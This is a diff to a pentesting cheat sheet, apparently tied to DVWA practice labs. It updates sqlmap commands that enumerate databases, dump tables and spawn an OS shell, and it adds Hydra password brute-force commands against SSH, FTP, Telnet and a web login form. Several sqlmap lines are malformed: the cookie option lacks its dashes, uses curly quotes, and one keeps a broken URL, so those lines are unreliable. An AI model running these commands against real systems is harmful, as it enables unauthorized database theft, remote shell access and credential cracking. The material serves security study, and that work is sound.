@@ -243,23 +243,25 @@ nc -vnl -p 1234
   
 ```shell
 #List databases, add cookie values
-sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" --dbs  
+sqlmap -u "http://domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
+  OR
+sqlmap -u "http://domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
+
 
 # List Tables, add databse name
-sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" -D database_name --tables  
+sqlmap -u "http://domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
   
 # List Columns of that table
-sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" -D database_name -T table_name_user_login --columns
+sqlmap -u "http://domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
   
 #Dump all values of the table
-sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" -D database_name -T table_name_user_login --dump
+sqlmap -u "http://domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
   
 
-sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" --os-shell
-
-  
+sqlmap -u "http:domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --os-shell
+ 
 ```
-  
+* Some links [DVWA:Blind SQL with SQLMap](https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7), [DVWA - High Level with SQLMap](https://www.youtube.com/watch?v=IR1JsaSQLMc&ab_channel=Archidote)
   
   
   
@@ -267,6 +269,26 @@ sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" --os-
 
 <details>
 <summary>Password Cracking</summary>
+ > Hydra : FTP, SSH, Telnet
+```shell
+# SSH
+~# hydra -l username -P passlist.txt 192.168.0.100 ssh
+  
+ # FTP
+~# hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
+ 
+# If the service isn't running on the default port, use -s
+~# hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+  
+# TELNET
+~# hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet
+
+# Login form
+~# sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
+  
+  
+  
+  ```
   
 </details>
   
